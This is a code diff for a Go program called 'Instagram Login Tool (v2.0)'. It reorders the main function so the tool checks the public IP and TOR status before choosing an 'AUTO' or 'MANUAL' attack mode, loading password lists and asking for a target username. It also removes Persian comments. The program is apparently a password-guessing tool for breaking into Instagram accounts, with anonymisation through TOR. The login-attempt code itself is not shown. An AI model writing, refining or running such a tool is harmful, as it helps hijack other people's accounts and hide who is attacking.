@@ -78,26 +78,6 @@ func main() {
 	setupLogger()
 	fmt.Println(" ***Instagram Login Tool (v2.0)*** ")
 	fmt.Printf("coded by: %s\n\n", CURRENT_USER)
-
-	// نمایش منو و انتخاب حالت
-	mode := selectMode()
-	var passwords []string
-
-	if mode == 1 {
-		// AUTO ATTACK
-		passwords = loadPasswordsAuto()
-	} else {
-		// MANUAL ATTACK
-		passwords = loadPasswordsManual()
-	}
-
-	if len(passwords) == 0 {
-		fmt.Println("No passwords found!")
-		return
-	}
-
-	fmt.Printf("\nLoaded %d passwords\n", len(passwords))
-
 	fmt.Println("\nChecking Public IPs...\n")
 
 	ipDirect, errDirect := getPublicIP(&http.Client{Timeout: 10 * time.Second})
@@ -127,6 +107,24 @@ func main() {
 	} else {
 		fmt.Println("TOR is not active , direct connection is active\n")
 	}
+
+	mode := selectMode()
+	var passwords []string
+
+	if mode == 1 {
+		// AUTO ATTACK
+		passwords = loadPasswordsAuto()
+	} else {
+		// MANUAL ATTACK
+		passwords = loadPasswordsManual()
+	}
+
+	if len(passwords) == 0 {
+		fmt.Println("No passwords found!")
+		return
+	}
+
+	fmt.Printf("\nLoaded %d passwords\n", len(passwords))
 
 	username := getUsername()
 	if username == "" {
@@ -186,7 +184,6 @@ func main() {
 	}
 }
 
-// تابع منو
 func selectMode() int {
 	reader := bufio.NewReader(os.Stdin)
 	fmt.Println("Choose attack mode:")
@@ -207,12 +204,11 @@ func selectMode() int {
 	}
 }
 
-// بارگذاری پسورد خود ابزار
 func loadPasswordsAuto() []string {
 	return loadPasswordsFromFiles("password.txt", "password.json")
 }
 
-// بارگذاری پسورد از فایل کاربر
+
 func loadPasswordsManual() []string {
 	reader := bufio.NewReader(os.Stdin)
 	fmt.Print("Enter your password file path: ")
@@ -221,7 +217,6 @@ func loadPasswordsManual() []string {
 	return loadPasswordsFromFiles(filePath, "")
 }
 
-// تابع عمومی بارگذاری پسورد
 func loadPasswordsFromFiles(txtFile string, jsonFile string) []string {
 	var passwords []string
 	if txtFile != "" {
